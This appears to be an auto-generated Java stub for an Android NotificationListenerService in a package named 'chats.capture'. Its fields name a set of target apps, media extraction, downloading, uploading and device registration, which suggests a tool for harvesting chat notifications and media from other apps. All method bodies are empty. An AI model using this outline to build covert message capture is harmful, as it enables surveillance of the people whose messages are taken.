package com.chats.capture.services;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000^\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\"\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0010\u000b\n\u0002\b\u0007\u0018\u0000 &2\u00020\u0001:\u0001&B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0010\u0010\u0014\u001a\u00020\u00132\u0006\u0010\u0015\u001a\u00020\u0016H\u0002J\u0016\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u001aH\u0082@\u00a2\u0006\u0002\u0010\u001bJ\u0010\u0010\u001c\u001a\u00020\u00132\u0006\u0010\u0015\u001a\u00020\u0016H\u0002J\u0010\u0010\u001d\u001a\u00020\u00132\u0006\u0010\u001e\u001a\u00020\u0013H\u0002J\u0010\u0010\u001f\u001a\u00020 2\u0006\u0010\u001e\u001a\u00020\u0013H\u0002J\b\u0010!\u001a\u00020\u0018H\u0016J\b\u0010\"\u001a\u00020\u0018H\u0016J\u0010\u0010#\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u001aH\u0016J\u0010\u0010$\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u001aH\u0016J\b\u0010%\u001a\u00020\u0018H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\fX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u000eX\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0014\u0010\u0011\u001a\b\u0012\u0004\u0012\u00020\u00130\u0012X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\'"}, d2 = {"Lcom/chats/capture/services/NotificationCaptureService;", "Landroid/service/notification/NotificationListenerService;", "()V", "deviceRegistrationManager", "Lcom/chats/capture/managers/DeviceRegistrationManager;", "mediaDownloader", "Lcom/chats/capture/utils/MediaDownloader;", "mediaExtractor", "Lcom/chats/capture/utils/MediaExtractor;", "mediaFileDao", "Lcom/chats/capture/database/MediaFileDao;", "mediaUploadManager", "Lcom/chats/capture/managers/MediaUploadManager;", "notificationDao", "Lcom/chats/capture/database/NotificationDao;", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "targetAppPackages", "", "", "calculateFileChecksum", "file", "Ljava/io/File;", "captureNotification", "", "sbn", "Landroid/service/notification/StatusBarNotification;", "(Landroid/service/notification/StatusBarNotification;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "determineMimeType", "getAppName", "packageName", "isTargetApp", "", "onCreate", "onDestroy", "onNotificationPosted", "onNotificationRemoved", "startForegroundService", "Companion", "app_debug"})
public final class NotificationCaptureService extends android.service.notification.NotificationListenerService {
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    private com.chats.capture.database.NotificationDao notificationDao;
    private com.chats.capture.database.MediaFileDao mediaFileDao;
    private com.chats.capture.utils.MediaExtractor mediaExtractor;
    private com.chats.capture.utils.MediaDownloader mediaDownloader;
    private com.chats.capture.managers.MediaUploadManager mediaUploadManager;
    private com.chats.capture.managers.DeviceRegistrationManager deviceRegistrationManager;
    @org.jetbrains.annotations.NotNull()
    private final java.util.Set<java.lang.String> targetAppPackages = null;
    private static final int NOTIFICATION_SERVICE_ID = 1001;
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.services.NotificationCaptureService.Companion Companion = null;
    
    public NotificationCaptureService() {
        super();
    }
    
    @java.lang.Override()
    public void onCreate() {
    }
    
    @java.lang.Override()
    public void onDestroy() {
    }
    
    @java.lang.Override()
    public void onNotificationPosted(@org.jetbrains.annotations.NotNull()
    android.service.notification.StatusBarNotification sbn) {
    }
    
    @java.lang.Override()
    public void onNotificationRemoved(@org.jetbrains.annotations.NotNull()
    android.service.notification.StatusBarNotification sbn) {
    }
    
    private final java.lang.Object captureNotification(android.service.notification.StatusBarNotification sbn, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    private final boolean isTargetApp(java.lang.String packageName) {
        return false;
    }
    
    private final java.lang.String getAppName(java.lang.String packageName) {
        return null;
    }
    
    private final java.lang.String calculateFileChecksum(java.io.File file) {
        return null;
    }
    
    private final java.lang.String determineMimeType(java.io.File file) {
        return null;
    }
    
    private final void startForegroundService() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0012\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0005"}, d2 = {"Lcom/chats/capture/services/NotificationCaptureService$Companion;", "", "()V", "NOTIFICATION_SERVICE_ID", "", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
}